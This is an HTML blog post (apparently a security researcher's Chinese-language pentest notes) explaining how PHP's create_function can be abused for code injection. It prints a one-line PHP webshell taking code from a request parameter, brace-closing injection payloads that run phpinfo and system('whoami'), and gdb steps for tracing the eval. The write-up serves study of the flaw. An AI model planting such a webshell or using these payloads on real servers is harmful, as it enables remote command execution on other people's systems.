@@ -1,0 +1,330 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>create_function | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="p神在小密圈提了一个create_function的tips,就照之前的来说一句话:
+&amp;lt;?php $sl &amp;#x3D; create_function(&amp;#39;&amp;#39;, @$_REQUEST[&amp;#39;pass&amp;#39;]);$sl();?&amp;gt;
+
+只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:https://www.securityfocus.com/archive/1/496728
+不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:
+function create_function($args, $code) &amp;#123;
+  eval(&amp;quot;
+    function lambda_1 ($args) &amp;#123; $code &amp;#125;
+  &amp;quot;);
+  return &amp;#39;lambda_1&amp;#39;;
+&amp;#125;
+
+所以在第二个参数可控的情况下闭合大括号return 0; &amp;#125; echo &amp;#39;outside&amp;#39;; //，就可以执行:
+eval(&amp;quot;
+  function lambda_1 () &amp;#123; return 0; &amp;#125; echo &amp;#39;outside&amp;#39;; &amp;#x2F;&amp;#x2F; &amp;#125;
+&amp;quot;);
+
+第一个可控的情况下,这样就可以执行phpinfo:
+create_function(&amp;#39;)&amp;#123;&amp;#125;phpinfo();&amp;#x2F;&amp;#x2F;&amp;#39;, &amp;#39;&amp;#39;);
+
+可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="create_function"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> create_function</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
+  eval(&quot;
+    function lambda_1 ($args) &#123; $code &#125;
+  &quot;);
+  return &#39;lambda_1&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
+  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
+&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+<pre class="line-numbers language-none"><code class="language-none">gdb --args &#x2F;opt&#x2F;php72&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;pentest&#x2F;create1.php
+break zend_eval_stringl
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2019/01/10/create_function/create.png"></p>
+<p>图中的<code>function __lambda_function()&#123;&#125;phpinfo();//)&#123;&#125;</code>会整个当作字符串去做一个eval,所以就可以执行phpinfo了，之前纠结的点是<code>function __lambda_func()&#123;phpinfo();&#125;//)&#123;&#125;</code>这样才执行，因为看成这个函数去执行phpinfo。搜了下资料才慢慢明白。所以执行命令可以这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+create_function(&#39;)&#123;&#125;system(&quot;whoami&quot;);&#x2F;&#x2F;&#39;, &#39;&#39;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">The PHP interpreter supports eval in which you can evaluate any PHP expression. An interesting eval function is the zend_eval_stringl function that will PHP evaluate a string. So if we want to get the value of a specific variable $foo in a diversion session in RR we can execute print zend_eval_stringl(&quot;var_export($foo, true)&quot;, ...) in GDB7. To get the stack trace we can call the PHP function debug_backtrace() via zend_eval_stringl. <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>另外一点，匿名函数在php里面是有名字的:<code>\0__lambda_1</code>，最后1是数字，从小到达排列，它的第一个字符是空字符<code>\0</code>，因为用户无法在代码中定义这样的函数，其实还是可以的<code>&lt;?php $my_func = chr(0) . &quot;lambda_1&quot;;</code>，关于匿名函数有名字这个可以在Hitcon 2017 《Baby^H Master PHP 2017》的writeup里面找到。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7">https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp">https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp</a></li>
+<li><a target="_blank" rel="noopener" href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html">https://gywbd.github.io/posts/2016/2/debug-php-source-code.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/">http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/</a> </li>
+<li><a target="_blank" rel="noopener" href="https://gywbd.github.io/posts/2016/2/vld-opcode.html">https://gywbd.github.io/posts/2016/2/vld-opcode.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://treelib.com/book-detail-id-15-aid-604.html">http://treelib.com/book-detail-id-15-aid-604.html</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2019/01/10/create_function.html" class="leancloud-visitors view" data-flag-title="create_function">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2019/03/01/hashcat.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2018/12/18/pcntl_exec.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2019-01-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
